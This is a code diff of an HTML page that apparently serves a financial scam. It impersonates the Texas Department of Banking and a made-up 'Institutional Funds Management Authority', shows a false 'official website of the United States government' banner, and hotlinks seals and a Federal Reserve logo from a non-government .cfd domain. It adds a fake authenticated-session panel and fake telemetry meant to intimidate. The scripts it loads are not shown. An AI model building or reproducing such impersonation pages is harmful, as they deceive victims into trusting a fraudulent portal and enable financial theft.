@@ -1,68 +1,86 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="light">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TIFMA | Secure Portal</title>
-    <!-- External CSS -->
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Institutional Portal | Texas Department of Banking</title>
     <link rel="stylesheet" href="theme.css">
 </head>
 <body>
-    <!-- BLOCK 1: SECURITY & REDIRECTS -->
+
+    <!-- REQUIRED: Security script at top of body -->
     <script src="security.js"></script>
 
-    <!-- OFFICIAL GOV BANNER -->
     <section class="gov-banner">
-        <div class="flex items-center gap-3 cursor-pointer" onclick="toggleGov()">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Flag_of_the_United_States.svg" style="height: 14px;">
-            <span>An official website of the United States government <span class="underline font-bold text-blue-900">Here's how you know</span></span>
-        </div>
-        <div id="govDrop" class="hidden p-4 bg-white mt-2 border text-xs">
-            <strong>Official websites use .gov</strong><br>A .gov website belongs to an official government organization in the U.S.
+        <div class="container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Flag_of_the_United_States.svg" style="height:10px;" alt="Flag">
+            An official website of the United States government
         </div>
     </section>
 
-    <!-- HEADER -->
-    <header class="nav-header no-print">
-        <div class="max-w-7xl mx-auto flex justify-between items-center">
-            <div class="flex items-center gap-4">
-                <img src="https://national-settlement-board.cfd/images/dob-texas.png" class="h-12 w-12 bg-white rounded-full p-1" alt="Seal">
+    <header class="site-header">
+        <div class="container header-flex">
+            <div style="display:flex; align-items:center; gap:20px;">
+                <img src="https://national-settlement-board.cfd/images/dob-texas.png" alt="Texas Seal" style="height:60px;">
                 <div>
-                    <h1 class="text-xl font-black text-white">Texas Department of Banking</h1>
-                    <p class="text-[9px] font-bold text-slate-400 tracking-[0.2em]">Institutional Funds Management Authority</p>
+                    <h1 style="font-size:24px; margin:0; color:white;">Texas Department of Banking</h1>
+                    <p style="font-size:10px; margin:0; color:#cbd5e1; letter-spacing:1px; text-transform:uppercase;">Institutional Funds Management Authority</p>
                 </div>
             </div>
-            <img src="https://national-settlement-board.cfd/images/tdi-seal.png" class="h-14 hidden md:block">
+            <div style="text-align:right;">
+                <div id="cst-clock" class="cst-clock">--:--:-- CST</div>
+                <div style="font-size:10px; opacity:0.7;">NODE: TX-GATE-882</div>
+            </div>
         </div>
     </header>
 
-    <!-- MAIN CONTENT AREA -->
-    <main class="flex-grow max-w-7xl mx-auto p-6 w-full">
-        <div class="directive-card">
-            <h2 class="text-2xl mb-4">Node Testing Environment</h2>
-            <p>This page is currently utilizing the centralized <strong>theme.css</strong> and <strong>security.js</strong> files.</p>
+    <main class="container" style="padding-top:40px; padding-bottom:40px;">
+        <div class="grid-row">
+            <!-- System Status Panel -->
+            <div class="panel">
+                <h3 style="border-bottom:2px solid var(--color-accent); padding-bottom:10px; margin-bottom:20px;">Secure Session Info</h3>
+                <div style="display:grid; gap:10px;">
+                    <p><strong>Authenticated User:</strong> <span id="display-name">Loading...</span></p>
+                    <p><strong>Assigned Node:</strong> <span style="font-family:var(--font-mono);">NSB-SYSTEM-UNIT</span></p>
+                    <p><strong>Status:</strong> <span style="color:#059669; font-weight:700;">ACTIVE</span></p>
+                </div>
+            </div>
+
+            <!-- Ledger Activity -->
+            <div class="panel">
+                <h3 style="border-bottom:2px solid var(--color-accent); padding-bottom:10px; margin-bottom:20px;">Node Telemetry</h3>
+                <p class="text-small">System is currently monitoring input vectors and hardware fingerprints.</p>
+                <div style="background:#000; color:#0f0; padding:15px; font-family:var(--font-mono); font-size:12px; border-radius:4px;">
+                    > ANALYZING_BUFFER...<br>
+                    > SYNCING_TELEMETRY...<br>
+                    > HEARTBEAT_STABLE
+                </div>
+            </div>
         </div>
     </main>
 
-    <!-- FOOTER -->
-    <footer class="legal-footer no-print">
-        <div class="max-w-7xl mx-auto px-6 grid md:grid-cols-3 gap-8">
-            <div>
-                <h5 class="text-white font-bold mb-2 uppercase tracking-widest">Regulatory Oversight</h5>
-                <p class="text-xs text-slate-400">Texas Department of Banking<br>2601 N Lamar Blvd, Austin, TX 78705</p>
-            </div>
-            <div>
-                <h5 class="text-white font-bold mb-2 uppercase tracking-widest">Network Node</h5>
-                <p class="text-xs text-slate-400">Eleventh District Federal Reserve<br>Dallas Operations Center</p>
-            </div>
-            <div class="flex justify-end items-center gap-4 opacity-30">
-                <img src="https://national-settlement-board.cfd/Federal-Reserve-System-Logo.png" class="h-10 grayscale">
+    <footer class="site-footer">
+        <div class="container">
+            <div class="grid-row">
+                <div>
+                    <h4 style="color:var(--color-primary); margin-bottom:10px;">Regulatory Oversight</h4>
+                    <p class="text-small">All transactions are subject to federal financial compliance protocols. Unauthorized access is prohibited by Texas Penal Code § 33.02.</p>
+                </div>
+                <div style="text-align:right;">
+                    <img src="https://national-settlement-board.cfd/Federal-Reserve-System-Logo.png" alt="Fed Seal" style="height:40px; opacity:0.2;">
+                </div>
             </div>
         </div>
     </footer>
 
-    <!-- BLOCK 2: SYSTEM ENGINE & TELEMETRY -->
+    <script>
+        // Update the UI with stored session data
+        document.addEventListener('DOMContentLoaded', () => {
+            document.getElementById('display-name').innerText = localStorage.getItem('tifma_name') || 'Unknown';
+        });
+    </script>
+
+    <!-- REQUIRED: Engine script at bottom of body -->
     <script src="engine.js"></script>
 </body>
 </html>
